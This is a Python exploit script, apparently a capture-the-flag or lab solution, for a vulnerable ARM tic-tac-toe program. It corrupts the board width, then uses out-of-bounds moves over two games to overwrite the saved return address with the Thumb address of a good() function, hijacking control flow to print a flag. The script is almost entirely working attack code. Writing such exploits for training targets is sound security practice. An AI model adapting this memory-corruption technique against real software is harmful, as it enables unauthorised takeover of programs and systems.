import interact

# --- REPLACE THIS WITH THE ACTUAL ADDRESS OF good() ---
# Example: If objdump says 0x0001052c, put 0x0001052c
GOOD_ADDR = 0x1167c

# Add 1 to satisfy the Thumb mode LSB requirement
THUMB_ADDR = GOOD_ADDR + 1 

# Extract the lower two bytes we need to write
byte0 = THUMB_ADDR & 0xFF
byte1 = (THUMB_ADDR >> 8) & 0xFF

p = interact.Process()

# We play one game for each byte we want to write
bytes_to_write = [byte0, byte1]

for i, b in enumerate(bytes_to_write):
    print(f"\n[*] --- Starting Game {i+1} to write byte: {hex(b)} ---")
    
    # Step 1: Set our player character to the exact hex byte we want to write
    p.readuntil("Play as X or O: ")
    p.sendline(chr(b)) 

    # Step 2: Corrupt width
    p.readuntil("Where would you like to play? ")
    p.sendline("0")
    print("[*] Width corrupted.")

    # Step 3: Write the byte to the Return Address
    target_location = 21 + i
    p.readuntil("Where would you like to play? ")
    p.sendline(str(target_location))
    print(f"[*] Wrote {hex(b)} to LR offset {target_location - 1}.")

    # Step 4: Safely fast-forward the game without deadlocking on readline()
    while True:
        # Read up to the next question mark
        prompt = p.readuntil("?").decode()
        
        if "like to play" in prompt:
            # Game is still asking for moves, send a safe invalid move
            p.sendline("99")
            
        elif "Play again" in prompt:
            # Game ended! Decide whether to rematch or pop the shell
            if i < len(bytes_to_write) - 1:
                print("[*] Game over. Requesting rematch for the next byte...")
                p.sendline("y")
            else:
                print("[*] All bytes written! Declining rematch to trigger return...")
                p.sendline("n")
            break

# Boom! The program returns, jumps exactly to good(), and pops the flag.
print("\n[*] Output:")
p.interactive()
